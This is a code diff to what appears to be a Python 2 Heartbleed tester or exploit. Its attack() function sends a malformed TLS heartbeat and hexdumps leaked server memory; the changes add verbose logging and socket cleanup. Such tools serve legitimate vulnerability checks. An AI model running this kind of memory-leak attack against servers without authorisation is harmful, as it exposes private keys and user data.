@@ -169,6 +169,7 @@ def attack(ip, port, tlsversion, starttls='none', timeout=5):
             s.send("AUTH TLS\n")
             recvall(s, buffer_size)
         
+        if verbose: print '[INFO] Sending ClientHello'
         s.send(gen_clienthello(tlsversion))
         
         while True:
@@ -177,15 +178,20 @@ def attack(ip, port, tlsversion, starttls='none', timeout=5):
                 print >> sys.stderr, '\033[93m[ERROR] The server closed the connection without sending the ServerHello. This might mean the server does not support ' + tlslongver + ' or it might not support SSL/TLS at all.\033[0m\n'
                 sys.stderr.flush()
                 return False
-            elif type == 22 and ord(payload[0]) == 0x0E:
+            elif type == 22 and ord(payload[-4]) == 0x0E:
+                if verbose: print '[INFO] ServerHello received'
                 break
         
+        if verbose: print '[INFO] Sending Heartbeat'
         s.send(gen_heartbeat(tlsversion))
         
         while True:
             type, version, payload = recvmsg(s, timeout)
             if type is None:
-                print '[INFO] No heartbeat response was received. The server is probably not vulnerable.\n'
+                print '[INFO] No heartbeat response was received. The server is probably not vulnerable.'
+                if verbose: print '[INFO] Closing connection'
+                s.close()
+                print ''
                 sys.stdout.flush()
                 return False
             
@@ -197,9 +203,11 @@ def attack(ip, port, tlsversion, starttls='none', timeout=5):
                     else:
                         print '[INFO] Displaying response (lines consisting entirely of null bytes are removed):'
                     print ''
-                    sys.stdout.flush()
                     hexdump(payload)
                     print ''
+                    if verbose: print '[INFO] Closing connection\n'
+                    sys.stdout.flush()
+                    s.close()
                     return True
                 else:
                     print '[INFO] The server processed the malformed heartbeat, but did not return any extra data.\n'
@@ -210,13 +218,12 @@ def attack(ip, port, tlsversion, starttls='none', timeout=5):
                 print '[INFO] The server received an alert. It is likely not vulnerable.'
                 if verbose: print '[INFO] Alert Level: ' + alert_levels[ord(payload[0])]
                 if verbose: print '[INFO] Alert Description: ' + alert_descriptions[ord(payload[1])] + ' (see RFC 5246 section 7.2)'
+                if verbose: print '[INFO] Closing connection'
+                s.close()
                 print ''
                 sys.stdout.flush()
                 return False
-        
-        hexdump(payload)
-        
-        socket.close()
+    
     except socket.error as e:
         print >> sys.stderr, '\033[93m[ERROR] Connection error. The port might not be open on the host.\033[0m\n'
         sys.stderr.flush()
